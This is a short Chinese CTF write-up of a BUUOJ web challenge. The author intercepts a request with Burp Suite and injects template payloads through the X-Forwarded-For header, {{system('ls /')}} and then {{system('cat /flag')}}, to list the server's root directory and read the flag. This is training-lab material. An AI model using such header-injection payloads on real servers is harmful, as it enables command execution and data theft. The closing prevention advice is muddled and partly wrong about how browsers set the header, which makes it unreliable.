>怎么也逃不出~burp suite的世界~

## 1
点来点去没什么头绪，php文件都是摆在明面上的，把页面源代码几个看不懂的都翻译了翻译，发现一个是适配低版本IE浏览器一个是前端实现浮动字效果……心寒……

burpsuite抓包，wp说`IP`->`X-Forwarded-For`（乍一听怪扯的……不过在读过X-Forwarded-For文档里面反复提及的警告后就理解了一点了。）。
所以浅学一下<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For>X-Forwarded-For</a>。

## 2
接下来就是添加HTTP请求头

```HTTP
GET /flag.php HTTP/1.1
Host: node4.buuoj.cn:29729
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
X-Forwarded-For:1//是的我添；
Connection: close
```
forward之后界面从`Your IP Is: 10.xx`变成了`Your IP: Is 1`。
injec成功！！
```HTTP
X-Forwarded-For: {{system('ls /')}}
```
进而查找到了**flag**所在位置，接着
```HTTP
X-Forwarded-For: {{system('cat /flag')}}
```



---
## 3

`X-Forwarded-For` 是一个HTTP 请求头字段。在正常情况下，它用于标识客户端的原始 IP 地址，尤其在经过代理（如负载均衡器、反向代理等）的情况下。（在尝试访问bing.com的时候modifyheader就是利用这个原理）
`X-Forwarded-For: {{system('ls /')}}` 是一个恶意构造的输入，试图通过伪造的 `X-Forwarded-For` 头字段执行系统命令 `ls /` 来获取服务器上根目录的文件列表。然而，这是一种违规和危险的行为，可能会导致系统安全风险和非法访问。
**预防**：
- 1.对于HTTP请求头字段，在正常情况下浏览器会发送真实的客户端IP地址，而不是接受用户输入的X-Forwarded-For值。这样可以避免恶意用户伪造IP地址来执行攻击。
- 2.大多数Web服务器也会验证和过滤请求头字段，确保其中的数据是合法和安全的。
此外，系统管理员也应该采取必要的安全措施来保护服务器免受攻击。这包括配置正确的防火墙规则、定期更新和升级软件以修复安全漏洞，并按照最佳实践设置服务器和应用程序。
